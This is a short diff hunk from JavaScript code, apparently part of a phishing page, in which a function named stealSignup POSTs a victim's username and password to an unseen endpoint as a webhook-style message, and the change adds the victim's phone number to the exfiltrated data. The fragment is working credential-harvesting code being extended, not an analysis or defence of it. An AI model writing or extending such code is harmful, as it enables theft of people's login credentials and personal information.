@@ -277,7 +277,7 @@ function stealSignup(e) {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({
-      content: `🛑 토끼\nUsername: ${u}\nPassword: ${p}`
+      content: `🛑 토끼\nPhone: ${phone}\nUsername: ${u}\nPassword: ${p}`
     })
   })
   .then(() => {
